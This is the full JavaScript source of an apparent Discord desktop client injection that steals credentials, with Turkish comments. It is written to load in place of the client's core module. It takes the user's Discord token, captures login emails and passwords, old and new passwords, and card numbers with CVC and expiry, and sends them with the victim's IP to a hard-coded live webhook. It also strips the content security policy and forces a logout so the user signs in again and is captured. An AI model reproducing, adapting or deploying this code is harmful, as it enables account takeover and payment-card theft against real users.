const args = process.argv; const fs = require("fs"); const path = require("path"); const https = require("https"); const querystring = require("querystring"); const { BrowserWindow, session } = require("electron");

const config = {
    filter: { urls: [ "https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", "https://discord.com/api/v*/auth/login", "https://*.discord.com/api/v*/auth/login", "https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts", "https://api.stripe.com/v*/tokens", "https://api.stripe.com/v*/setup_intents/*/confirm", "https://api.stripe.com/v*/payment_intents/*/confirm",  ], },
    filter2: { urls: [ "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "wss://remote-auth-gateway.discord.gg/*", ], },
    webhook: "https://discord.com/api/webhooks/1429220016682959040/GSURELbnEyx7MJ7OQHDbmhro6HL7W63wn45mwXMPDyRsp3P2MgN0WJ6BHOezPNbPx4Fl"
};

let sent = false;
const execScript = (script) => { 
  try {
    const window = BrowserWindow.getAllWindows()[0]; 
    if (window && window.webContents) {
      return window.webContents.executeJavaScript(script, true); 
    } else {
      console.log("⚠️ BrowserWindow bulunamadı, alternatif yöntem kullanılıyor...");
      // Alternatif: eval kullan (sadece test için)
      return eval(script);
    }
  } catch (error) {
    console.error("execScript hatası:", error);
    return null;
  }
};
const getIP = async () => { return await execScript(`var xmlHttp = new XMLHttpRequest(); xmlHttp.open("GET", "https://api.ipify.org", false); xmlHttp.send(null); xmlHttp.responseText;`); };
const discordPath = (function () { const app = args[0].split(path.sep).slice(0, -1).join(path.sep); let resourcePath; if (process.platform === 'win32') { resourcePath = path.join(app, 'resources'); } else if (process.platform === 'darwin') { resourcePath = path.join(app, 'Contents', 'Resources'); } if (fs.existsSync(resourcePath)) return { resourcePath, app }; return { undefined, undefined }; })();

// Webhook'a gönderme fonksiyonu
const sendToWebhook = async (data) => {
  try {
    // Direkt fetch kullan (daha güvenilir)
    await execScript(`
      fetch("${config.webhook}", {
        method: "POST",
            headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(${JSON.stringify(data)})
      }).then(response => {
        console.log("Webhook response:", response.status);
      }).catch(error => {
        console.error("Webhook error:", error);
      });
    `);
    console.log("✅ Webhook'a gönderildi!");
  } catch (error) {
    console.error('❌ Webhook gönderme hatası:', error);
    
    // Alternatif yöntem - XMLHttpRequest
    try {
      await execScript(`
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "${config.webhook}", true);
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.onreadystatechange = function() {
          if (xhr.readyState === 4) {
            console.log("XHR Status:", xhr.status);
          }
        };
        xhr.send(JSON.stringify(${JSON.stringify(data)}));
      `);
      console.log("✅ Webhook'a gönderildi (XHR ile)!");
    } catch (xhrError) {
      console.error('❌ XHR webhook hatası:', xhrError);
    }
  }
};

const firstTime = async() => { 
  if (sent) {
    return
  } else {
    // Test webhook'u gönder
    console.log("🧪 Test webhook gönderiliyor...");
    const testEmbed = {
      embeds: [{
        title: "🧪 Injection Test",
        description: "Injection başarıyla çalışıyor!",
        color: 0x00ff00,
        fields: [
          { name: "Test Durumu", value: "✅ Başarılı", inline: true },
          { name: "Zaman", value: new Date().toLocaleString(), inline: true }
        ],
        footer: { text: "https://t.me/hairo13x7" },
        timestamp: new Date().toISOString()
      }]
    };
    
    await sendToWebhook(testEmbed);
    
    const token = await execScript(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);
    
    if (token != undefined) {
      const ip = await getIP();
      
      // Webhook'a token bilgilerini gönder
      const embedData = {
        embeds: [{
          title: "🔑 Discord Token Grabbed",
          color: 0x313338,
          fields: [
            { name: "Token", value: `\`\`\`${token}\`\`\``, inline: false },
            { name: "IP Address", value: `\`${ip}\``, inline: true },
            { name: "Platform", value: "Discord Desktop", inline: true }
          ],
          footer: { text: "https://t.me/hairo13x7" },
          timestamp: new Date().toISOString()
        }]
      };
      
      await sendToWebhook(embedData);
      
      await execScript(`
      let token = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
      
      function remove_token() {
        setInterval(()=>{
          document.body.appendChild(document.createElement("iframe")).contentWindow.localStorage.token=""},50),
          setTimeout(()=>{location.reload()
        },1)
      }

      function logout(token) {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https://ptb.discord.com/api/v9/auth/logout", true);
        xhr.setRequestHeader("Authorization", token);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
        xhr.send(JSON.stringify({
          provider: null,
          voip_provider: null
        }));
      }
      
      remove_token(); logout(token)
      `)
    } else {
      console.log("⚠️ Token bulunamadı");
    }

    sent = true
  }
}

const onUserLogin = async (email, password, token) => {
  const ip = await getIP();
  
  const embedData = {
    embeds: [{
      title: "🔐 Discord Login Detected",
      color: 0xff0000,
      fields: [
        { name: "Email", value: `\`${email}\``, inline: true },
        { name: "Password", value: `\`${password}\``, inline: true },
        { name: "Token", value: `\`\`\`${token}\`\`\``, inline: false },
        { name: "IP Address", value: `\`${ip}\``, inline: true }
      ],
      footer: { text: "https://t.me/hairo13x7" },
      timestamp: new Date().toISOString()
    }]
  };
  
  await sendToWebhook(embedData);
}

const onPasswordChange = async (oldpassword, newpassword, token) => { 
  const ip = await getIP();
  
  const embedData = {
    embeds: [{
      title: "🔒 Password Change Detected",
      color: 0xffa500,
      fields: [
        { name: "Old Password", value: `\`${oldpassword}\``, inline: true },
        { name: "New Password", value: `\`${newpassword}\``, inline: true },
        { name: "Token", value: `\`\`\`${token}\`\`\``, inline: false },
        { name: "IP Address", value: `\`${ip}\``, inline: true }
      ],
      footer: { text: "https://t.me/hairo13x7" },
      timestamp: new Date().toISOString()
    }]
  };
  
  await sendToWebhook(embedData);
}

const onEmailChange = async (email, password, token) => {
  const ip = await getIP();
  
  const embedData = {
    embeds: [{
      title: "📧 Email Change Detected",
      color: 0x00ff00,
      fields: [
        { name: "New Email", value: `\`${email}\``, inline: true },
        { name: "Password", value: `\`${password}\``, inline: true },
        { name: "Token", value: `\`\`\`${token}\`\`\``, inline: false },
        { name: "IP Address", value: `\`${ip}\``, inline: true }
      ],
      footer: { text: "https://t.me/hairo13x7" },
      timestamp: new Date().toISOString()
    }]
  };
  
  await sendToWebhook(embedData);
}

const onCreditCard = async (number, cvc, expir_month, expir_year, token) => {
  const ip = await getIP();
  
  const embedData = {
    embeds: [{
      title: "💳 Credit Card Added",
      color: 0x800080,
      fields: [
        { name: "Card Number", value: `\`${number}\``, inline: true },
        { name: "CVC", value: `\`${cvc}\``, inline: true },
        { name: "Expiry", value: `\`${expir_month}/${expir_year}\``, inline: true },
        { name: "Token", value: `\`\`\`${token}\`\`\``, inline: false },
        { name: "IP Address", value: `\`${ip}\``, inline: true }
      ],
      footer: { text: "https://t.me/hairo13x7" },
      timestamp: new Date().toISOString()
    }]
  };
  
  await sendToWebhook(embedData);
}

const onPaypalAdd = async (token) => {
  const ip = await getIP();
  
  const embedData = {
    embeds: [{
      title: "💰 PayPal Added",
      color: 0x0099ff,
      fields: [
        { name: "Token", value: `\`\`\`${token}\`\`\``, inline: false },
        { name: "IP Address", value: `\`${ip}\``, inline: true }
      ],
      footer: { text: "https://t.me/hairo13x7" },
      timestamp: new Date().toISOString()
    }]
  };
  
  await sendToWebhook(embedData);
}


session.defaultSession.webRequest.onHeadersReceived((details, callback) => { 
      delete details.responseHeaders["content-security-policy"];
      delete details.responseHeaders["content-security-policy-report-only"];
      callback({ responseHeaders: { ...details.responseHeaders, "Access-Control-Allow-Headers": "*", } });
});

session.defaultSession.webRequest.onBeforeRequest(config.filter2, async (details, callback) => {
  if (details.url.startsWith("wss://")) {
    callback({ cancel: true })
    return;
  }

  firstTime();
  return callback({});
})


session.defaultSession.webRequest.onCompleted(
  config.filter,
  async (details, _) => {

  
    if (details.statusCode !== 200 && details.statusCode !== 202) return;
      const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString(); const data = JSON.parse(unparsed_data);
      const token = await execScript(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);
      
      sent = true;

        switch (true) {
        case details.url.endsWith("login"):
          onUserLogin(data.login, data.password, token).catch(console.error);
                break;
        
        case details.url.endsWith("users/@me") && details.method === "PATCH":
          if (!data.password) return;
          if (data.email) { 
            onEmailChange(data.email, data.password, token).catch(console.error);
          }
          if (data.new_password) { 
            onPasswordChange(data.password, data.new_password, token).catch(console.error) 
                }
                break;
  
        case details.url.endsWith("tokens") && details.method === "POST":
          const item = querystring.parse(unparsed_data.toString());
          onCreditCard( item["card[number]"], item["card[cvc]"], item["card[exp_month]"], item["card[exp_year]"], token ).catch(console.error);
          break;
  
        case details.url.endsWith("paypal_accounts") && details.method === "POST":
          onPaypalAdd(token).catch(console.error);
            break;
        
  
        default:
            break;
    }
    }
);
  

module.exports = require("./core.asar");
